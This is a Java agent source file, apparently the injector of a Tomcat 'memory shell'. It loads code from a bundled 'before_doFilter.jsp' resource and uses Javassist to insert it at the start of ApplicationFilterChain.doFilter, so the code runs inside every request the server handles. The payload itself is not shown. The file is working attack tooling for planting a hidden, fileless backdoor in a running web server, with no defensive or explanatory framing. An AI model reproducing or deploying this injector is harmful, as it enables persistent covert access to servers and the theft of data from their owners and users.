import javassist.*;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {
    public static String code = "";
    public Transformer(){
        Transformer.code = new String(
                readResource(Transformer.class,"before_doFilter.jsp")
        ).replace("<%","").replace("%>","");
    }
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        String wantedClassName = "org.apache.catalina.core.ApplicationFilterChain";
        String wantedMethod = "doFilter";
        String wantedClassNameJVM = wantedClassName.replace(".","/");
        if(wantedClassNameJVM.equals(className)){
            try{
                ClassPool pool = ClassPool.getDefault();
                ClassPath path = new LoaderClassPath(classBeingRedefined.getClassLoader());
                pool.appendClassPath(path);
                CtClass clazz = pool.get(wantedClassName);
                CtMethod method = clazz.getDeclaredMethod(wantedMethod);
                method.insertBefore(Transformer.code);
                return clazz.toBytecode();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        return classfileBuffer;
    }

    public static byte[] readResource(Class thisclass,String path) {
        try {
            InputStream inputStream = thisclass.getClassLoader().getResourceAsStream(path);
            byte[] bytes = readAllBytesFromInputStream(inputStream);

            return bytes;
        }catch (Exception e){
            System.out.println(e.getStackTrace());
        }
        return null;
    }
    public static byte[] readAllBytesFromInputStream(InputStream inputStream) throws IOException {
        final int bufLen = 4 * 0x400;
        byte[] buf = new byte[bufLen];
        int readLen;
        Exception exception = null;
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try {
            while ((readLen = inputStream.read(buf)) != -1)
                outputStream.write(buf, 0, readLen);
            return outputStream.toByteArray();
        }catch (EOFException e){
            return outputStream.toByteArray();
        } catch (IOException e) {
            exception = e;
            throw e;
        } finally {
            outputStream.close();
            if (exception == null) inputStream.close();
            else try {
                inputStream.close();
            } catch (IOException e) {
                exception.addSuppressed(e);
            }
        }
    }
}